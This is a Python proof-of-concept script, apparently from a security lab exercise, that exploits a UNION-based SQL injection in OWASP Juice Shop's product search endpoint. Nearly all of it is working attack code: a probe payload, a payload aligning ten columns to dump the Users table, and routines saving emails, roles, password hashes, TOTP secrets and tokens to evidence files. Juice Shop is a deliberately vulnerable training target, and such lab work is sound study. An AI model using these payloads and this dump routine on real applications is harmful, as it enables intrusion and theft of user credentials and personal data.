#!/usr/bin/env python3
"""
c05-sqli-union-dump  --  UNION-based SQL injection against OWASP Juice Shop
=============================================================================
Vulnerable endpoint : GET /rest/products/search?q=<INJECT>
Backend             : SQLite (Sequelize / knex)
Vulnerable query    : SELECT * FROM Products
                      WHERE ((name LIKE '%<q>%' OR description LIKE '%<q>%')
                             AND deletedAt IS NULL) ORDER BY name
Why it works        : <q> is string-concatenated. Sending  qwerty'))  closes the
                      LIKE literal and the two wrapping parens, letting us append
                      a UNION SELECT with the same 10 columns as `SELECT *`.
Column count        : 10  (discovered via error oracle:
                      "SELECTs to the left and right of UNION do not have the
                       same number of result columns")
Error messages      : leaked verbatim in the HTML error page -> SQLi confirmed
                      and gives an oracle for development.

Users table schema (from sqlite_master):
  id | username | email | password | role | deluxeToken | lastLoginIp |
  profileImage | totpSecret | isActive | createdAt | updatedAt | deletedAt

Products columns (10) : id, name, description, price, deluxePrice, image,
                        alternateImages, createdAt, updatedAt, deletedAt
We therefore align: id->id, username->name, email->description, password->price,
role->deluxePrice, deluxeToken->image, lastLoginIp->alternateImages,
profileImage->createdAt, totpSecret->updatedAt, isActive->deletedAt

Outputs
  /workspace/evidence/c5_users.txt        <- first 10 rows: email<TAB>role
  /workspace/evidence/c5_users_full.json  <- full dump incl. password hashes
"""
import json
import sys
import urllib.error
import urllib.parse
import urllib.request

BASE = "http://host.docker.internal:3000"
ENDPOINT = BASE + "/rest/products/search?q="
OUT_TXT = "/workspace/evidence/c5_users.txt"
OUT_JSON = "/workspace/evidence/c5_users_full.json"


def inject(payload: str) -> str:
    """Send a payload; return the raw response body (JSON or error HTML)."""
    url = ENDPOINT + urllib.parse.quote(payload, safe="")
    req = urllib.request.Request(url, headers={"User-Agent": "c05-poc/1.0"})
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            return r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:          # 500 carries the SQL error
        return e.read().decode("utf-8", "replace")


def parse(body: str):
    try:
        return json.loads(body).get("data")
    except Exception:
        return None


def error_of(body: str) -> str:
    i = body.find("Error:")
    return body[i:i + 200].split("<")[0] if i >= 0 else body[:200]


def main() -> int:
    # ------------------------------------------------ 1. confirm injection
    probe = "qwerty')) UNION SELECT 1,2,3,4,5,6,7,8,9,10--"
    rows = parse(inject(probe))
    if not rows:
        print("[!] injection probe failed:", error_of(inject(probe)))
        return 1
    print("[+] SQLi CONFIRMED via UNION (10 columns reflected)")
    print("    echo row:", json.dumps(rows[0])[:200])

    # ------------------------------------------------ 2. dump Users table
    payload = (
        "qwerty')) UNION SELECT "
        "id, username, email, password, role, deluxeToken, "
        "7, profileImage, totpSecret, isActive "
        "FROM Users--"
    )
    print("\n[*] payload:", payload)
    body = inject(payload)
    rows = parse(body)
    if rows is None:
        print("[!] dump failed:", error_of(body))
        return 1

    users = []
    for r in rows:
        users.append({
            "id":           r.get("id"),
            "username":     r.get("name"),
            "email":        r.get("description"),
            "password":     r.get("price"),
            "role":         r.get("deluxePrice"),
            "deluxeToken":  r.get("image"),
            "lastLoginIp":  None,  # column name is filtered by the app - not needed
            "profileImage": r.get("createdAt"),
            "totpSecret":   r.get("updatedAt"),
            "isActive":     r.get("deletedAt"),
        })
    users.sort(key=lambda u: (u["id"] is None, u["id"]))

    print(f"[+] Extracted {len(users)} rows from `Users`\n")
    hdr = f"{'id':>3}  {'email':<34} {'role':<10} {'pw-hash (first 32)':<34} username"
    print(hdr)
    print("-" * len(hdr))
    for u in users:
        pw = str(u["password"] or "")
        print(f"{str(u['id']):>3}  {str(u['email']):<34} {str(u['role']):<10} "
              f"{pw[:32]:<34} {u['username']}")

    # ------------------------------------------------ 3. save evidence
    with open(OUT_JSON, "w") as f:
        json.dump(users, f, indent=2)

    with open(OUT_TXT, "w") as f:
        f.write("# c05-sqli-union-dump - full Users table via UNION-based SQLi\n")
        f.write("# target  : GET http://host.docker.internal:3000/rest/products/search?q=\n")
        f.write("# backend : SQLite (Sequelize) - 10 columns\n")
        f.write(f"# payload : {payload}\n")
        f.write("# format  : email<TAB>role<TAB>password_hash\n")
        for u in users[:10]:
            f.write(f"{u['email']}\t{u['role']}\t{u['password']}\n")

    print(f"\n[+] {OUT_TXT}  (first 10 rows: email + role)")
    print(f"[+] {OUT_JSON}  (all {len(users)} rows, incl. password hashes)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
